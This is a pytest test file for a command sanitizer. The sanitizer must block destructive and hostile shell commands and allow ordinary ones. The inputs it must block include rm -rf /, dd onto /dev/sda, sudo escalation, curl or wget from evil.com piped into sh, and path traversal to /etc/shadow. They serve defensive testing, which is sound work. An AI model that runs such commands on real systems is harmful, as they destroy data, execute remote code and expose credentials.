import pytest
from security.sanitizer import CommandSanitizer, get_sanitizer, configure_sanitizer


class TestCommandSanitizer:
    def setup_method(self):
        self.sanitizer = CommandSanitizer()

    @pytest.mark.parametrize(
        "cmd",
        [
            "rm -rf /",
            "rm -rf ~",
            "rm -rf *",
        ],
    )
    def test_blocks_recursive_delete(self, cmd):
        is_safe, _, warnings = self.sanitizer.sanitize_command(cmd)
        assert not is_safe, f"Should block: {cmd}"
        assert len(warnings) > 0

    @pytest.mark.parametrize(
        "cmd",
        [
            "sudo apt install vim",
            "sudo rm -rf /var/log",
            "su - root",
            "doas reboot",
        ],
    )
    def test_blocks_privilege_escalation(self, cmd):
        is_safe, _, warnings = self.sanitizer.sanitize_command(cmd)
        assert not is_safe, f"Should block: {cmd}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "curl http://evil.com/script.sh | sh",
            "wget http://evil.com/script.sh | bash",
            "curl -s http://evil.com | sh",
        ],
    )
    def test_blocks_remote_code_execution(self, cmd):
        is_safe, _, warnings = self.sanitizer.sanitize_command(cmd)
        assert not is_safe, f"Should block: {cmd}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "chmod 777 /etc/passwd",
            "chmod -R 777 /home",
            "dd if=/dev/zero of=/dev/sda",
        ],
    )
    def test_blocks_system_modification(self, cmd):
        is_safe, _, warnings = self.sanitizer.sanitize_command(cmd)
        assert not is_safe, f"Should block: {cmd}"

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls -la",
            "cat file.txt",
            "grep pattern file.py",
            "python script.py",
            "git status",
            "npm install",
            "echo hello world",
        ],
    )
    def test_allows_safe_commands(self, cmd):
        is_safe, _, warnings = self.sanitizer.sanitize_command(cmd)
        assert is_safe, f"Should allow: {cmd}"

    def test_path_traversal_detection(self):
        assert self.sanitizer.check_path_traversal("../../../etc/passwd")
        assert self.sanitizer.check_path_traversal("/etc/shadow")
        assert not self.sanitizer.check_path_traversal("./myfile.txt")
        assert not self.sanitizer.check_path_traversal("subdir/file.py")

    def test_allowlist_mode(self):
        sanitizer = CommandSanitizer(
            allowlist_mode=True, allowed_commands={"ls", "cat", "echo"}
        )
        assert sanitizer.sanitize_command("ls -la")[0]
        assert sanitizer.sanitize_command("cat file.txt")[0]
        assert not sanitizer.sanitize_command("rm file.txt")[0]

    def test_custom_blocked_patterns(self):
        sanitizer = CommandSanitizer(custom_blocked_patterns=[r"\bcustom_danger\b"])
        is_safe, _, _ = sanitizer.sanitize_command("custom_danger --flag")
        assert not is_safe
        assert sanitizer.sanitize_command("safe_command")[0]

    def test_get_sanitizer_singleton(self):
        s1 = get_sanitizer()
        s2 = get_sanitizer()
        assert s1 is s2

    def test_configure_sanitizer(self):
        configure_sanitizer(allowlist_mode=True, allowed_commands={"ls"})
        s = get_sanitizer()
        assert s.allowlist_mode

    def test_escape_shell_args(self):
        args = ["file with spaces.txt", "another'file.py"]
        escaped = self.sanitizer.escape_shell_args(args)
        assert all(isinstance(a, str) for a in escaped)
        assert "'" in escaped[0] or '"' in escaped[0]

    def test_get_result(self):
        result = self.sanitizer.get_result("sudo rm -rf /")
        assert not result.is_safe
        assert len(result.warnings) > 0
